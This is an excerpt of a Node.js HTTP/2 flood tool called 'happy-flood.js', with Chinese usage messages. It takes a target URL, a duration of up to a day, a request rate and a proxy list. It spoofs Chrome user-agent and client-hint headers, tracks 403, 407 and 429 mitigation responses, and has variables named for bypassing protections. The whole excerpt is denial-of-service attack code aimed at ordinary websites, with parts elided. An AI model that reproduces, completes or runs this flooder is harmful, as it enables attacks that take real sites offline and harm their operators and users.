...
const targetDate = new Date('2025-1-01');
...
const proxynewIndex = process.argv.indexOf('--browserv1');
const proxynew = proxynewIndex !== -1 && proxynewIndex + 1 < process.argv.length ? process.argv[proxynewIndex + 1] : undefined;

const useragentIndex = process.argv.indexOf('--browserv2');
const useragentua = useragentIndex !== -1 && useragentIndex + 1 < process.argv.length ? process.argv[useragentIndex + 1] : undefined;
...
if (!reqmethod || !target || !time || !ratelimit) {
    console.clear();
    console.error(`
    使用 & 示例:
    node happy-flood.js https://google.com/ 120 5 50 proxy.txt
...
if (!['GET', 'POST', 'HEAD', 'OPTIONS'].includes(reqmethod)) {
    console.error('请求方法为 GET/POST/HEAD/OPTIONS');
    process.exit(1);
}

if (!target.startsWith('https://') && !target.startsWith('http://')) {
    console.error('目标协议 https:// or http://');
    process.exit(1);
}

if (isNaN(time) || time <= 0 || time > 86400) {
    console.error('时间无法大于 86400')
    process.exit(1);
}

if (isNaN(ratelimit) || ratelimit <= 0 || ratelimit > 1000) {
    console.error(`速率无法大于 1000`)
    process.exit(1);
}
...
function buildRequest() {
    ...
    if (useragentua) {
        userAgent = useragentua;
        const versionreg = /Chrome\/([0-9.]+)/;
        const mathchr = userAgent.match(versionreg);

        if (mathchr !== null) {
            var ogogog = mathchr[1];
            brandValue = `"Not_A Brand";v="8", "Chromium";v="${ogogog}", "Google Chrome";v="${ogogog}"`;
        }
    } else {
...
let mitigationsPidoras = 0;
setInterval(() => {
    mitigationsPidoras = mitigationsPidoras + 1;
}, 1000);
                    ...
                    while (data.length >= 9) {
                        ...
                        if (frame != null) {
                            ...
                            if (frame.type == 1 && debugMode) {
                                ...
                                if(mitigationsPidoras >= 5) {
                                    console.log(`Status code: ${status} | IP: ${proxynew} | Cookie: ${cookieValue}`);
                                    mitigationsPidoras = 0;
                                }
                                ...
                                if (shouldCloseSession && (status[403] || status[407] || status[429])) {
                                    tlsSocket.end(() => tlsSocket.destroy());
                                    return;
                                }
                            }
                ...
                function doWrite() {
                    ...
                    for (let i = 0; i < (isFull ? ratelimit : 1); i++) {
                        ...
                        const headers = Object.entries({
                            ...
                            ":scheme": "https",
                            ":path": url.pathname, //.slice(0, -1) + gogobypassknown,
                        ...
                        const combinedHeaders = headers.concat(headers4);
